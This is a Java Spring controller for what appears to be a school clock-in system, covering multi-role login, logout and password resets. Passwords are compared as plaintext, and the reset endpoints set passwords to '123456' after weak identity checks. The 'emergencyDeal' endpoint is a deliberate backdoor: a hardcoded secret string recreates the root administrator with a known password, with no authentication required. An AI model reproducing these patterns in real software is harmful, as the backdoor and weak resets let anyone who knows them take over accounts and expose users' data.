package com.example.clocksystem.controller;

import com.example.clocksystem.entity.*;
import com.example.clocksystem.service.*;
import jakarta.servlet.http.HttpSession;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

/**
 * LoginController
 *
 * @author 94548
 * @date 2023/9/10
 */
@Controller
public class LoginController {
    @Autowired
    StudentService studentService;
    @Autowired
    AdminService adminService;
    @Autowired
    TeacherService teacherService;
    @Autowired
    SocietyService societyService;
    @Autowired
    OfficeService officeService;

    /**
     * 展示登录页
     *
     * @return 登录页面视图
     */
    @GetMapping("/index")
    public String showLoginPage() {
        return "index";
    }

    /**
     * 用户登录
     *
     * @param username 用户名
     * @param password 密码
     * @param session  session对象
     * @param model    model对象
     * @return 相应的用户主页视图
     */
    @PostMapping("/login")
    public String login(@RequestParam String username, @RequestParam String password, HttpSession session, Model model) {
        Student student = studentService.studentFindStudent(username);
        Admin admin = adminService.adminFindAdmin(username);
        Teacher teacher = teacherService.teacherFindTeacher(username);
        Society society = societyService.societyFindSociety(username);
        Office office = officeService.officeFindOffice(username);
        if (teacher != null) {
            // 教师
            if (password.equals(teacher.getPassword())) {
                session.setAttribute("teacher", teacher);
                return "/teacher/teacher";
            }else {
                model.addAttribute("errMsg","账号或密码错误!");
                return "/index";
            }
        } else if (admin != null) {
            // 管理员
            if (password.equals(admin.getPassword())) {
                session.setAttribute("admin", admin);
                return "/admin/admin";
            }else {
                model.addAttribute("errMsg","账号或密码错误!");
                return "/index";
            }
        } else if (student != null) {
            // 学生
            if (password.equals(student.getPassword())) {
                session.setAttribute("student", student);
                return "/student/student";
            }else {
                model.addAttribute("errMsg","账号或密码错误!");
                return "/index";
            }
        } else if (society != null) {
            // 社团
            if (password.equals(society.getPassword())) {
                session.setAttribute("society", society);
                return "/society/society";
            }else {
                model.addAttribute("errMsg","账号或密码错误!");
                return "/index";
            }
        } else if (office != null) {
            // 教务处
            if (password.equals(office.getPassword())) {
                session.setAttribute("office", office);
                return "/office/office";
            }else {
                model.addAttribute("errMsg","账号或密码错误!");
                return "/index";
            }
        } else {
            model.addAttribute("errMsg","账号或密码错误!");
            return "/index";
        }
    }

    /**
     * 用户退出
     *
     * @param session session对象
     * @return 登录页面视图
     */
    @GetMapping("/logout")
    public String logout(HttpSession session) {
        session.removeAttribute("teacher");
        session.removeAttribute("admin");
        session.removeAttribute("student");
        session.removeAttribute("society");
        session.removeAttribute("office");
        return "/index";
    }

    /**
     * 跳转到找回密码的视图
     * @return 找回密码的视图
     */
    @GetMapping("/findPassword")
    public String findPassword() {
        return "/findPassword/findPassword";
    }

    /**
     * 重置学生密码
     * @param sNo 学号
     * @param sPhone 学生手机号
     * @param idCard 学生身份证
     * @return 重置结果
     */
    @PostMapping("/resetStudent")
    @ResponseBody
    public int resetStudent(String sNo,String sPhone,String idCard) {
        var student=studentService.studentFindStudent(sNo);
        //没有此学生
        if(student==null){
            return 1;
        }
        if(sPhone.equals(student.getSPhone()) && idCard.equals(student.getIdCard())){
            student.setPassword("123456");
            studentService.studentUpdateInfo(student);
            return 0;
        }
        return 1;
    }

    /**
     * 重置教师密码
     * @param tNo 教师号
     * @param tPhone 教师手机号
     * @return 重置结果
     */
    @PostMapping("/resetTeacher")
    @ResponseBody
    public int resetTeacher(String tNo,String tPhone) {
        var teacher=teacherService.teacherFindTeacher(tNo);
        //没有此教师
        if(teacher==null){
            return 1;
        }
        if(tPhone.equals(teacher.getTPhone())){
            teacher.setPassword("123456");
            teacherService.teacherUpdateInfo(teacher);
            return 0;
        }
        return 1;
    }

    /**
     * 重置社团密码
     * @param societyId 社团号
     * @param sName 创始人名字
     * @param tName 指导老师名字
     * @return 重置结果
     */
    @PostMapping("/resetSociety")
    @ResponseBody
    public int resetSociety(String societyId,String sName,String tName) {
        var society=societyService.societyFindSociety(societyId);
        //没有此社团
        if(society==null){
            return 1;
        }
        if(sName.equals(society.getStudent().getSName()) && tName.equals(society.getTeacher().getTName())){
            society.setPassword("123456");
            societyService.societyUpdatePassword(society);
            return 0;
        }
        return 1;
    }

    /**
     * 紧急处理
     * @param secret 秘密序列号
     * @return 返回处理结果
     */
    @PostMapping("/emergencyDeal")
    @ResponseBody
    public int emergencyDeal(String secret,HttpSession session) {
        if("woaiguangjin".equals(secret)){
            var admin=adminService.adminFindAdmin("root");
            if(admin==null){
                admin=new Admin();
            }
            admin.setId("root");
            admin.setPassword("123456");
            adminService.adminDeleteAdmin(null,admin);
            adminService.adminAddAdmin(admin);
            return 0;
        }
        return 1;
    }

}
